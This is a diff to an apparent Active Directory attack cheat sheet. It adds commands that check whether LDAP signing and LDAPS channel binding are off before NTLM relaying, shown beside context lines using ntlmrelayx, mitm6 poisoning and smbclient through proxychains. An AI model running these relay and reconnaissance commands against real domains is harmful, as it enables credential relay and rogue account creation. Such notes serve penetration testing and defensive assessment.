@@ -142,6 +142,16 @@ proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
 ### LDAP Relaying
+- Requires LDAP signing to be turned off (default)
+
+#### Check LDAP Signing
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
+
+cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-signing
+```
+
 ### LDAP Relay force HTTP/WEBDAV requests
 - Requires HTTP/WEBDAV requests, because SMB signing is enabled by default.
 
@@ -196,6 +206,13 @@ ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
 ### LDAPS Relaying
 - Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects
 - When possible, use the FQDN instead of the IP address. The IP address works most of the time, but FQDN looks cleaner and avoids SNI certificate conflicts.
+- Requires LDAPS binding to be turned off (default)
+
+#### Check LDAPS binding
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
+```
 
 #### Enable the LDAPS relay
 - Can wait for mitm6 to poison or force it
